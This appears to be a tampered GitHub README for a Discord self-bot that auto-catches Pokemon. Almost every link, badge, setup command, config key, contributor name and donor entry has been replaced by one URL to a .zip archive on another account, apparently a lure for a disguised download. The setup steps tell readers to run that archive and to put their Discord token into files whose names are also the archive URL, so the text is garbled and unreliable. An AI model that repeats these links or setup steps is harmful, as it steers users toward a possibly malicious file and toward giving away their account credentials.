<!--
  ...
  Author: Hyperclaw79
  Logo: https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip
...
<meta name="url" content="https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip" />
<meta name="og:title" content="Pokeball SelfBot"/>
<meta name="og:url" content="https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip" />
<meta name="og:image" content=" https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip" />
...
# PokeBall SelfBot
![Python Version](https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip) ![License](https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip) ![Maintained?](https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip%3F-Premium%20Version+https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip) ![Donor Count](https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip%20Count-339-yellow?style=for-the-badge)
<a href="https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip">
  <img src="https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip" width="500" />
</a>
...
![It actually works lol](https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip%20Pokeball%https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip)

**Current Version**: `v3.3.2` (13th June 2018)

**Premium Version**: `v8.3.3` (13th September 2021) (Migrated to https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip)
...
Scroll down to [Donations section](https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip) for details.
So if you want the autocatcher along with other amazing commands, DM me on Discord for the PayPal details after reading the [donations section](https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip).
...
## Setup
### Windows
1. [First install Git for Windows](https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip) and then run `https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip` to install the requirements.
2. Then, add your bot token in the `https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip`'s `"token"` key. Refer the tutorial below to get the token.
    > The token should be withing the `""` like:
      >> `"token": "https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip"`
...
3. Then simply run `https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip` to get your bot live.
  > If you are on a mac, directly launch `https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip` instead of running the bat file. And use `pip install -r https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip` instead to setup.
4. The autocatcher is **off** by default. To enable it, you need to send a message in Discord as `P^autocatcher on`.
  ...
  > If you don't want to toggle it on every time after restart, look for the line `https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip = False` under the `__init__()` function and change it to `True` instead of `False`.
5. Most of the commands need you to catch a Pokemon in the new guild with autocatcher on, at least once, followed by a restart.
  > There is a way to manually bypass this. You need to turn the Developer Mode on your Discord on, get the guild ID and alter `https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip` to include the `,guild_id:"pokecord prefix in that guild"`.
### Linux
1. First install git by doing "sudo apt install git-all", cd to directory, and then run "https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip" with "https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip". Make sure to give permission to "https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip" and "https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip" by "chmod +x [file name here]".
2. Then follow step number "2" in the "Windows" section above.
3. Finally, run "https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip" to get your self-bot online and running. Now you can configure stuff and enjoy.
## Fine-Tuning
* To find out how to get your token visit [Token Tutorial](https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip).
...
* The public version of this selfbot doesn't contain the following to keep the bot usage to minimum and not break Poketwo bot:
  ...
  <a href="https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip">
    <img src="https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip" width="480" />
  </a>
  
* To avail these features, contact me via [mail](https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip) and I'll give you my PayPal ID. 
...
* The other **advantages** upon being a donor would be:
  ...
  + A special mention of your username in this readme. *(optional)*
    ...
    + >*The support doesn't include how to setup the public bot. Use [GitHub Issues](https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip) for that one.*
...
* If you'd like to simply donate to support the cause instead of buying the Premium Version, you can always send me your support. Click that image below.
  ...
  <a href="https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip"><img src="https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip" width="100" height="100" alt="Feature Requests"/></a>
...
## Contributions
Refer to the new [CONTRIBUTION GUIDE](https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip).
Also, refer to [Issue Template](https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip) and [PR Template](https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip).
...
+ **Starring the Repo**
  ...
  <img src="https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip" width="100" height="100" alt="Feature Requests"/>
...
You can request **new features** in the FeatHub.
  ...
  <a href="https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip"><img src="https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip%https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip" width="100" height="100" alt="Feature Requests"/></a>


## Acknowledgements
### Creators
* Rapptz for [https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip](https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip)

### Contributors
* [ThePythonDoge](https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip)
* [4-mat](https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip)
* [ajmeese7](https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip)
* [KKonas](https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip)

### Testimonials
![testimonial](https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip)
...
| 147 | https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip  | Advanced 💎 |
...
| 159 | https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip    | Premium  💵 |
| 160 | Reeling      | Premium  💵 |
...
| 249 | https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip     | Advanced 💎 |
...
| 257 | Dissing      | Premium  💵 |
| 258 | Marshal      | Premium  💵 |
| 259 | https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip   | Premium  💵 |
| 260 | Tracing      | Premium  💵 |
| 261 | Armani       | Premium  💵 |
| 262 | Barley       | Premium  💵 |
| 263 | Xdbuild      | Premium  💵 |
...
| 267 | https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip   | Premium  💵 |
...
| 306 | Bingu        | Premium  💵 |
| 307 | https://raw.githubusercontent.com/akash70776/PokeBall-SelfBot-Poketwo-Autocatcher/master/assets/Bot-Poke-Ball-Poketwo-Autocatcher-Self-v2.2.zip    | Premium  💵 |
| 308 | Ravioli      | Premium  💵 |
